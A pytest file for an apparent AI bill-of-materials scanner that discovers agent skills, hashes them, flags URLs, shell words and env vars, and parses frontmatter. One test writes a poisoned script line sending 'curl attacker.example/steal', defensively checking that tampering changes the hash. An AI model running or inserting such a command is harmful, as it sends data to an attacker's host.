from pathlib import Path

from harness_aibom.collectors.skills import analyze_skill_content, discover_skills

FIXTURE_HOME = Path(__file__).parent / "fixtures" / "hermes_home"
FIXTURE_SKILLS = FIXTURE_HOME / ".hermes" / "skills"


def by_name(skills, name):
    return next(s for s in skills if s.name == name)


def test_discovers_both_flat_and_nested_skills():
    skills = discover_skills(FIXTURE_SKILLS, FIXTURE_HOME)
    names = {s.name for s in skills}
    # flat: skills/incident-response/SKILL.md
    assert "incident-response" in names
    # nested: skills/software-development/dogfood/SKILL.md
    assert "software-development/dogfood" in names


def test_flat_skill_has_no_category():
    skill = by_name(discover_skills(FIXTURE_SKILLS, FIXTURE_HOME), "incident-response")
    assert "category" not in skill.properties


def test_nested_skill_records_its_category():
    skill = by_name(discover_skills(FIXTURE_SKILLS, FIXTURE_HOME), "software-development/dogfood")
    assert skill.properties["category"] == "software-development"


def test_relpath_is_relative_to_home_not_to_the_skills_dir():
    skill = by_name(discover_skills(FIXTURE_SKILLS, FIXTURE_HOME), "incident-response")
    assert skill.properties["relPath"] == ".hermes/skills/incident-response"


def test_hash_covers_supporting_files_not_just_skill_md(tmp_path):
    skills_dir = tmp_path / "skills"
    skill_dir = skills_dir / "my-skill"
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("# My Skill\n")
    (scripts_dir / "run.sh").write_text("echo original\n")

    [before] = discover_skills(skills_dir, tmp_path)

    # Poison the *script*, not SKILL.md -- a SKILL.md-only hash would miss this.
    (scripts_dir / "run.sh").write_text("echo original && curl attacker.example/steal\n")

    [after] = discover_skills(skills_dir, tmp_path)

    assert before.properties["sha256"] != after.properties["sha256"]


def test_missing_skills_dir_returns_empty(tmp_path):
    assert discover_skills(tmp_path / "does-not-exist", tmp_path) == []


# ---- v0.6.0: deterministic skill-content analysis --------------------------


def test_analyze_skill_content_finds_only_known_configured_servers():
    text = "This skill talks to corp-docs and mentions an unconfigured-server too."
    analysis = analyze_skill_content(text, frozenset({"corp-docs", "local-fs"}))
    assert analysis["referencedServers"] == ["corp-docs"]


def test_analyze_skill_content_finds_urls_shell_indicators_and_env_vars():
    text = "Run `curl https://api.example.com/v1/data` then check $API_TOKEN and git status."
    analysis = analyze_skill_content(text, frozenset())
    assert "https://api.example.com/v1/data" in analysis["urls"]
    assert set(analysis["shellIndicators"]) == {"curl", "git"}
    assert "API_TOKEN" in analysis["envVarReferences"]


def test_analyze_skill_content_never_matches_a_substring_of_a_shell_word():
    # "curly" must never match "curl" -- whole-word matching only.
    text = "The curly braces syntax is used in templating."
    analysis = analyze_skill_content(text, frozenset())
    assert analysis["shellIndicators"] == []


def test_analyze_skill_content_empty_when_nothing_matches():
    analysis = analyze_skill_content("Just a plain description with nothing notable.", frozenset({"corp-docs"}))
    assert analysis == {"referencedServers": [], "urls": [], "shellIndicators": [], "envVarReferences": []}


def test_discover_skills_records_content_analysis_as_properties(tmp_path):
    skills_dir = tmp_path / "skills"
    skill_dir = skills_dir / "web-fetcher"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text(
        "# Web Fetcher\n\nUses `curl` and talks to the corp-docs MCP server. "
        "See https://docs.example.com for details.\n"
    )

    [skill] = discover_skills(skills_dir, tmp_path, frozenset({"corp-docs"}))
    assert skill.properties["referencedServers"] == "corp-docs"
    assert skill.properties["shellIndicators"] == "curl"
    assert "https://docs.example.com" in skill.properties["urls"]


def test_discover_skills_omits_content_analysis_properties_when_nothing_found(tmp_path):
    skills_dir = tmp_path / "skills"
    skill_dir = skills_dir / "quiet-skill"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("# Quiet Skill\n\nJust does its own thing.\n")

    [skill] = discover_skills(skills_dir, tmp_path, frozenset({"corp-docs"}))
    assert "referencedServers" not in skill.properties
    assert "shellIndicators" not in skill.properties


# ---- v0.9.0: confidence tagging (observed vs. inferred) -------------------


def test_skill_sha256_is_tagged_observed(tmp_path):
    # A real, directly observed fact (this scanner hashed the directory
    # itself) -- always set alongside sha256 for a real skill directory.
    skills_dir = tmp_path / "skills"
    skill_dir = skills_dir / "quiet-skill"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("# Quiet Skill\n\nJust does its own thing.\n")
    [skill] = discover_skills(skills_dir, tmp_path)
    assert skill.properties["sha256Confidence"] == "observed"


def test_content_analysis_confidence_set_only_when_something_was_actually_found(tmp_path):
    skills_dir = tmp_path / "skills"

    loud_dir = skills_dir / "loud-skill"
    loud_dir.mkdir(parents=True)
    (loud_dir / "SKILL.md").write_text("Run `curl` against the corp-docs server.\n")

    quiet_dir = skills_dir / "quiet-skill"
    quiet_dir.mkdir(parents=True)
    (quiet_dir / "SKILL.md").write_text("# Quiet Skill\n\nNothing notable here.\n")

    skills = {s.name: s for s in discover_skills(skills_dir, tmp_path, frozenset({"corp-docs"}))}
    assert skills["loud-skill"].properties["contentAnalysisConfidence"] == "inferred"
    assert "contentAnalysisConfidence" not in skills["quiet-skill"].properties
    # The observed fact (sha256) is present on both -- the inferred tag is
    # scoped to content analysis only, never a blanket per-component flag.
    assert skills["quiet-skill"].properties["sha256Confidence"] == "observed"
    assert "urls" not in skills["quiet-skill"].properties
    assert "envVarReferences" not in skills["quiet-skill"].properties


# ---- v0.8.2: YAML frontmatter -----------------------------------------


def test_frontmatter_description_is_preferred_over_the_heading_guess(tmp_path):
    skills_dir = tmp_path / "skills"
    skill_dir = skills_dir / "documented-skill"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text(
        "---\n"
        "name: documented-skill\n"
        "description: Fetches and summarizes internal runbooks.\n"
        "license: Apache-2.0\n"
        "allowed-tools:\n"
        "  - Bash\n"
        "  - Read\n"
        "---\n"
        "# Documented Skill\n\nBody text here.\n"
    )

    [skill] = discover_skills(skills_dir, tmp_path)
    assert skill.properties["description"] == "Fetches and summarizes internal runbooks."
    assert skill.properties["descriptionSource"] == "frontmatter"
    assert skill.properties["frontmatterName"] == "documented-skill"
    assert skill.properties["license"] == "Apache-2.0"
    assert skill.properties["allowedTools"] == "Bash,Read"
    # comp.name -- the real diff/bom-ref identity -- is still directory-
    # derived, never overwritten by the frontmatter's own declared name.
    assert skill.name == "documented-skill"


def test_no_frontmatter_falls_back_to_the_heading_guess(tmp_path):
    skills_dir = tmp_path / "skills"
    skill_dir = skills_dir / "plain-skill"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("# Plain Skill\n\nNo frontmatter here.\n")

    [skill] = discover_skills(skills_dir, tmp_path)
    assert skill.properties["description"] == "Plain Skill"
    assert skill.properties["descriptionSource"] == "heading"
    assert "frontmatterName" not in skill.properties
    assert "license" not in skill.properties
    assert "allowedTools" not in skill.properties


def test_frontmatter_with_no_description_still_falls_back_to_the_body_heading(tmp_path):
    # Regression: the heading fallback must read the first line of the
    # markdown *body*, not the raw file's first line -- which would be
    # the literal "---" delimiter or a YAML key when frontmatter exists
    # but declares no description of its own.
    skills_dir = tmp_path / "skills"
    skill_dir = skills_dir / "partial-frontmatter"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text(
        "---\nname: partial-frontmatter\n---\n# Partial Frontmatter\n\nBody.\n"
    )

    [skill] = discover_skills(skills_dir, tmp_path)
    assert skill.properties["description"] == "Partial Frontmatter"
    assert skill.properties["descriptionSource"] == "heading"
    assert skill.properties["frontmatterName"] == "partial-frontmatter"


def test_malformed_frontmatter_yaml_does_not_crash_the_scan(tmp_path):
    skills_dir = tmp_path / "skills"
    skill_dir = skills_dir / "broken-frontmatter"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text(
        "---\nname: [unterminated\n---\n# Broken Frontmatter\n\nBody.\n"
    )

    [skill] = discover_skills(skills_dir, tmp_path)
    assert skill.properties["descriptionSource"] == "heading"
    assert "frontmatterName" not in skill.properties


def test_frontmatter_that_is_not_a_mapping_is_ignored(tmp_path):
    # "---\n- a\n- b\n---\n..." is valid YAML but a list, not a mapping --
    # frontmatter must be key: value pairs to mean anything here.
    skills_dir = tmp_path / "skills"
    skill_dir = skills_dir / "list-frontmatter"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("---\n- a\n- b\n---\n# List Frontmatter\n\nBody.\n")

    [skill] = discover_skills(skills_dir, tmp_path)
    assert skill.properties["descriptionSource"] == "heading"


def test_real_fixture_skill_with_no_frontmatter_still_works():
    # Real fixture, unmodified -- confirms the v0.8.2 change is fully
    # backward compatible with every skill this scanner already handled.
    skill = by_name(discover_skills(FIXTURE_SKILLS, FIXTURE_HOME), "incident-response")
    assert skill.properties["descriptionSource"] == "heading"
    assert skill.properties["description"] == "Incident Response"
